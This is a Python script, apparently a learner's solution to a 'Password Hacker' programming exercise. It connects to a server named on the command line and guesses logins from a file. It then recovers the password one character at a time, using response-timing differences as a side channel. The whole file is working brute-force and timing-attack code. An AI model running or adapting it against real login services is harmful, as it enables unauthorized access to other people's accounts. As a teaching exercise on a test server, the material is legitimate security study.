# write your code here
import sys
import socket
import itertools
import random
from typing import TextIO
import json
from datetime import datetime
character_set = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

logins = []

#Generating logins from file (Step 4)
def list_of_logins_from_file():
    global logins
    file = open('C:/Users/gvskalyan/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt', 'r')
    for i in file.readlines():
        logins.append(i.strip('\n'))
    file.close()

hostname = sys.argv[1]
port = int(sys.argv[2])
# Generate passwords from file
address = (hostname, port)
login = ""
password = ""
dummy = ""
list_of_logins_from_file()
# Create a new socket.
client_socket = socket.socket()
# Connect to a host and a port using the socket.
client_socket.connect(address)
for i in logins:
    # Send a message from the third command line argument to the host using the socket.
    x = { "login" : i, "password" : " "}
    client_socket.send(json.dumps(x).encode(encoding='utf-8'))
    # Receive the server’s response. decoding from bytes to string
    response = json.loads(client_socket.recv(1024).decode(encoding='utf-8'))
    if response == {"result":"Wrong password!"}:
        login = i
        break
for i in range(20):
    for k in character_set:
        dummy = password + k
        x = {"login" : login ,"password": dummy }
        client_socket.send(json.dumps(x).encode(encoding='utf-8'))
        start = datetime.now()
        response = json.loads(client_socket.recv(1024).decode(encoding='utf-8'))
        finish = datetime.now()
        difference = finish - start
        if  difference.microseconds >= 10000:
            password = dummy
            continue
        if response == {"result":"Connection success!"}:
            break
    if response == {"result":"Connection success!"}:
        print(json.dumps({"login":login,"password":dummy}))
        break
# Print the server’s response.
# Close the socket.
client_socket.close()
